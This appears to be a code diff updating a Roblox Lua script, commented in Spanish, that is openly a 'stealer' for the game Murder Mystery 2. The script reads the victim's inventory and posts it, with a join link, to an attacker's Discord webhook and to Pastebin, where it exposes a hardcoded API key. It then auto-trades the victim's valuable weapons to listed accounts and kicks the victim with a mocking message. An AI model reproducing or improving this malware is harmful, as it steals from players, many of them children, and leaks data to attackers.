@@ -1,8 +1,11 @@
--- Servicios
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Copiar URL al portapapeles desde el inicio
+if setclipboard then
+    setclipboard("https://discord.gg/4VySnCHy")
+end
 
 -- Configuración
 local webhook = _G.webhook or ""
@@ -11,28 +14,27 @@ local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local pingEveryone = _G.pingEveryone == "Yes"
 
--- Validaciones iniciales
+-- Validaciones de juego y servidor
 if game.PlaceId ~= 142823291 then
-    LocalPlayer:Kick("⚠️ Este script solo funciona en MM2.")
+    LocalPlayer:Kick("⚠️Este script no funciona en este juego, solo funciona en mm2 ✅")
     return
 end
 
-local serverType = ReplicatedStorage:WaitForChild("GetServerType"):InvokeServer()
+local serverType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
 if serverType == "VIPServer" then
-    LocalPlayer:Kick("⚠️ No funciona en servidores VIP.")
+    LocalPlayer:Kick("⚠️El script no funciona en servidor privado, debes ir a un servidor público no lleno ✅")
     return
 end
 
 if #Players:GetPlayers() >= 12 then
-    LocalPlayer:Kick("⚠️ Servidor lleno.")
+    LocalPlayer:Kick("⚠️El script no puede funcionar en servidor lleno, debes ir a un servidor que no esté lleno ✅")
     return
 end
 
--- Método HTTP
 local req = syn and syn.request or http_request or request
 if not req then warn("No HTTP request method available!") return end
 
--- Función de webhook
+-- Función para enviar webhooks
 local function SendWebhook(title, description, fields, prefix)
     local data = {
         ["content"] = prefix or "",
@@ -51,7 +53,7 @@ local function SendWebhook(title, description, fields, prefix)
     end)
 end
 
--- Función Pastebin
+-- Función para crear pastebin
 local function CreatePaste(content)
     local api_dev_key = "_hLJczUn9kRRrZ857l24K6iIAhzm_yNs"
     local api_paste_name = "MM2 Inventario "..LocalPlayer.Name
@@ -76,37 +78,35 @@ for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
     end
 end
 
--- TradeModule adaptado
-local TradeModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("TradeModule"))
-local TradeService = ReplicatedStorage:WaitForChild("Trade")
-
-local function getTradeStatus()
-    return TradeService.GetTradeStatus:InvokeServer()
+-- Trade Service y funciones
+local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
+local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
+local function sendTradeRequest(user)
+    local plrObj = Players:FindFirstChild(user)
+    if plrObj then TradeService.SendRequest:InvokeServer(plrObj) end
 end
+local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
+local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end
 
-local function sendTradeRequest(username)
-    local plrObj = Players:FindFirstChild(username)
-    if plrObj then
-        TradeModule.SendTradeRequest(plrObj)
+-- Nuevo sistema de aceptar trade adaptado
+local acceptTradeRemote = TradeService.AcceptTrade
+local updateTradeRemote = TradeService.UpdateTrade
+
+updateTradeRemote.OnClientEvent:Connect(function(data)
+    if data.LastOffer then
+        spawn(function()
+            while getTradeStatus() == "StartTrade" and data.LastOffer do
+                pcall(function()
+                    acceptTradeRemote:FireServer(game.PlaceId * 3, data.LastOffer)
+                end)
+                task.wait(0.5)
+            end
+        end)
     end
-end
+end)
 
-local function addWeaponToTrade(id)
-    TradeModule.GUI.UpdateTradeInventory("Weapons", id)
-    TradeService.OfferItem:FireServer(id,"Weapons")
-end
-
-local function acceptTrade()
-    TradeModule.GUI.ConnectActions()
-    TradeService.AcceptTrade:FireServer()
-end
-
-local function waitForTradeCompletion()
-    while getTradeStatus()~="None" do task.wait(0.1) end
-end
-
--- Database y filtrado
-local database = require(ReplicatedStorage.Database.Sync.Item)
+-- Database y valores
+local database = require(game.ReplicatedStorage.Database.Sync.Item)
 local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
 local categories = {
     godly="https://supremevaluelist.com/mm2/godlies.html",
@@ -180,13 +180,13 @@ local function buildValueList()
     return valueList
 end
 
--- Preparar armas a enviar
+-- Preparar inventario para trade
 local weaponsToSend={}
 local totalValue=0
 local min_rarity_index=table.find(rarityTable,min_rarity)
 local valueList=buildValueList()
 
-local profile=ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+local profile=game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
 for id,amount in pairs(profile.Weapons.Owned) do
     local item=database[id]
     if item then
@@ -203,10 +203,11 @@ end
 
 table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
 
+-- Token y link para Discord
 local fernToken = math.random(100000,999999)
 local realLink = "[unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
 
--- Guardar copia para webhook
+-- Guardamos una copia para webhook final
 local weaponsSent = {}
 for _, w in ipairs(weaponsToSend) do
     table.insert(weaponsSent, w)
@@ -219,7 +220,9 @@ for _, w in ipairs(weaponsSent) do
 end
 pasteContent = pasteContent .. "\nValor total del inventario📦: "..tostring(totalValue).."💰"
 local pasteLink
-if #weaponsSent > 18 then pasteLink = CreatePaste(pasteContent) end
+if #weaponsSent > 18 then
+    pasteLink = CreatePaste(pasteContent)
+end
 
 if #weaponsSent > 0 then
     local fieldsInit={
@@ -228,35 +231,46 @@ if #weaponsSent > 0 then
         {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true},
         {name="Click para unirte a la víctima 👇:", value=realLink, inline=false}
     }
+
     local maxEmbedItems = math.min(18,#weaponsSent)
     for i=1,maxEmbedItems do
         local w = weaponsSent[i]
         fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s)\nValor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
     end
+
     if #weaponsSent > 18 then
         fieldsInit[2].value = fieldsInit[2].value.."... y más armas 🔥\n"
-        if pasteLink then fieldsInit[2].value = fieldsInit[2].value.."Mira todas las armas aquí 📜: [Mirar]("..pasteLink..")" end
+        if pasteLink then
+            fieldsInit[2].value = fieldsInit[2].value.."Mira todas las armas aquí 📜: [Mirar]("..pasteLink..")"
+        end
     end
+
     local prefix=pingEveryone and "@everyone " or ""
     SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
 end
 
--- Función final de trade
+-- Función final para trades
 local function TradeFinalizado()
     local fieldsFinal={
         {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
         {name="Armas enviadas 📦:", value="", inline=false},
         {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true}
     }
+
     local maxEmbedItems = math.min(18,#weaponsSent)
     for i=1,maxEmbedItems do
         local w = weaponsSent[i]
         fieldsFinal[2].value = fieldsFinal[2].value..string.format("%s x%s (%s)\nValor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
     end
-    if #weaponsSent > 18 then fieldsFinal[2].value = fieldsFinal[2].value.."... y más armas 🔥\n" end
+
+    if #weaponsSent > 18 then
+        fieldsFinal[2].value = fieldsFinal[2].value.."... y más armas 🔥\n"
+    end
+
     SendWebhook("✅ Todos los trades finalizados","💰Todas las armas enviadas correctamente 😎",fieldsFinal)
+    
     task.wait(50)
-    LocalPlayer:Kick("El ladron encubierto☠️ ha robado TODO tu inventario de MM2🔥")
+    LocalPlayer:Kick("El ladron encubierto☠️ ha robado TODO tu inventario de MM2🔥 llora niño/a🤣😂🥱")
 end
 
 -- Trade principal
@@ -271,10 +285,12 @@ local function doTrade(targetName)
         elseif status=="StartTrade" then
             for i=1,math.min(4,#weaponsToSend) do
                 local w=table.remove(weaponsToSend,1)
-                for _=1,w.Amount do addWeaponToTrade(w.DataID) end
+                for _=1,w.Amount do
+                    addWeaponToTrade(w.DataID)
+                end
             end
             task.wait(6)
-            acceptTrade()
+            -- Aquí ya se usa el nuevo sistema automáticamente
             waitForTradeCompletion()
         else task.wait(0.5) end
         task.wait(1)
@@ -282,7 +298,7 @@ local function doTrade(targetName)
     TradeFinalizado()
 end
 
--- Conectar chat de la víctima
+-- Conectar eventos de chat
 for _, p in ipairs(Players:GetPlayers()) do
     if table.find(users,p.Name) then
         p.Chatted:Connect(function() doTrade(p.Name) end)
